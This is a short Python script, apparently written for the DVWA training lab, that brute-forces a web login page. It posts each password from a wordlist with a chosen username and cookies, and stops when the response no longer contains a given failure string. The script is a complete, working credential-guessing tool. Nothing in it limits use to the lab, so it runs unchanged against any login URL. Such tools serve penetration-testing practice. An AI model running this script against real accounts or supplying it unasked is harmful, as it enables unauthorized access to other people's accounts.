import requests
import sys
import os

def validate_inputs(url, username, passwdfile):
    """Validate the inputs."""
    if not url.startswith('http://') and not url.startswith('https://'):
        print("Error: Invalid URL. Please provide a valid HTTP/HTTPS URL.")
        sys.exit(1)
    if not username:
        print("Error: Username cannot be empty.")
        sys.exit(1)
    if not os.path.isfile(passwdfile):
        print(f"Error: Password file '{passwdfile}' does not exist.")
        sys.exit(1)

def cracking(username, url, passwdfile, login_failed_string, cookies):
    """Attempt to brute force the login page."""
    try:
        with open(passwdfile, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                print('Trying: ' + password)
                data = {'username': username, 'password': password, 'Login': 'submit'}
                headers = {'Cookie': cookies} if cookies else {}
                response = requests.post(url, data=data, headers=headers)
                if login_failed_string in response.content.decode():
                    pass
                else:
                    print('Found username ==> ' + username)
                    print('Found password ==> ' + password)
                    sys.exit(0)
    except Exception as e:
        print(f"Error occurred: {e}")
        sys.exit(1)
    print('No match found')

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python bruteforce_dvwa.py <URL> <username> <password_file> <login_failed_string> [cookies]")
        sys.exit(1)
    
    # Get command line arguments
    url = sys.argv[1]
    username = sys.argv[2]
    passwdfile = sys.argv[3]
    login_failed_string = sys.argv[4]
    cookies = sys.argv[5] if len(sys.argv) > 5 else ""

    # Validate inputs
    validate_inputs(url, username, passwdfile)

    # Start cracking
    cracking(username, url, passwdfile, login_failed_string, cookies)
